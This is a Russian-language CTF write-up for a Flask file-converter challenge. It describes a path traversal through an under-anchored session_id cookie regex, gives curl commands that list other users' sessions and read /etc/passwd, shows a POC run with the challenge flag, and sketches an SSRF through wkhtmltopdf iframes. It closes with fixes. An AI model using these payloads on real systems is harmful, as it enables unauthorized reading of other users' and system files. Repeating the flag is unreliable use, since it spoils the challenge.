# Converter — Writeup

**Path Traversal через cookie `session_id` → чтение чужих файлов и файлов ОС**

Веб-таск · Стек: Flask + wkhtmltopdf

## Суть

Сервис конвертирует файлы (DOCX→PDF, CSV→XLSX). Загруженные и сгенерированные файлы хранятся в папке сессии `uploads/session_<session_id>/`, где `session_id` берётся из cookie. Цель — получить доступ к файлам **чужой** сессии, в одной из которых лежит флаг.

## Уязвимость

Идентификатор сессии из cookie проверяется регуляркой перед подстановкой в путь:

```python
def get_session_folder(session_id):
    if not re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}.*$', session_id):
        return 'Invalid session'
    session_folder = os.path.join(app.config['UPLOAD_FOLDER'], f'session_{session_id}')
    ...
    return session_folder
```

Регулярка требует лишь, чтобы строка **начиналась** с UUID — хвост `.*$` пропускает что угодно, включая `/../`. Санитизации пути нет. Значит cookie вида

```
session_id = e98ffba1-e24f-4de9-9218-57e9559dc4ac/../../
```

проходит проверку, и путь `uploads/session_<uuid>/../../` схлопывается вверх — за пределы каталога сессии. Эндпоинты `/myfiles` (`os.listdir`) и `/download/<file>` (`send_file`) начинают работать с произвольным каталогом.

## Эксплуатация (вручную)

**Листинг каталога `uploads/` — видим все сессии:**

```bash
curl --cookie "session_id=<uuid>/.." http://127.0.0.1:8000/myfiles
```

**Чтение файла ОС — `/etc/passwd`** (cookie уводит в `/etc`, скачиваем `passwd`):

```bash
curl --cookie "session_id=<uuid>/../../../etc" http://127.0.0.1:8000/download/passwd
```
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

(контейнер работает от root — доступен даже `/etc/shadow`).

## Добыча флага (POC)

Флаг лежит в сессии другого пользователя: `uploads/session_<victim>/secret_report.txt`. Скрипт [`POC.py`](POC.py) автоматизирует атаку — перечисляет все сессии, заходит в каждую через `/../session_<victim>` и ищет флаг в файлах:

```bash
python3 writeup/POC.py
```
```text
[*] Шаг 1: выходим в uploads/ и смотрим все сессии
    - session_2b377a79-71ab-43bb-b2a2-6a34126cc075
    - session_38e2d9a5-2b05-4ab3-a645-34fd60cac025
    - session_a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d
    ...
[*] Шаг 2-3: заходим в каждую чужую сессию, читаем файлы, ищем флаг
    session_a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d/secret_report.txt (122 b)  <-- ФЛАГ!

[+] НАЙДЕН ФЛАГ: errypie{c00kie_cr4wl3r_g0es_n0m_n0m_8a3f}
```

**Флаг:** `errypie{c00kie_cr4wl3r_g0es_n0m_n0m_8a3f}`

## Причина и исправление

**Причина:** регулярка валидирует только префикс строки (`.*$` на конце), путь из cookie подставляется без нормализации.

**Фикс:**
- привязать регулярку к концу строки, без «хвоста»: `^[0-9a-f-]{36}$` (ровно UUID), либо валидировать через `uuid.UUID(session_id)`;
- после построения пути проверять, что он не выходит за `uploads/`: сравнивать `os.path.realpath(session_folder)` с `os.path.realpath(UPLOAD_FOLDER)` (`commonpath`);
- имя файла на скачивании/загрузке пропускать через `werkzeug.utils.secure_filename`.

## Второй вектор (бонус): SSRF через DOCX→PDF

Текст параграфов `.docx` уходит в `wkhtmltopdf` как HTML без санитизации, поэтому `<iframe src="http://внутренний-хост/">` в документе заставляет сервер сделать запрос к внутреннему адресу, а ответ попадает в скачиваемый PDF (SSRF с чтением ответа). Локальные файлы (`file://`) в этой версии wkhtmltopdf заблокированы, работают `http(s)://`.

> Как развернуть челлендж с флагом (для стенда):
> ```bash
> docker compose exec converter sh -c \
>   'mkdir -p uploads/session_a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d && \
>    printf "flag: errypie{...}\n" > uploads/session_a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d/secret_report.txt'
> ```
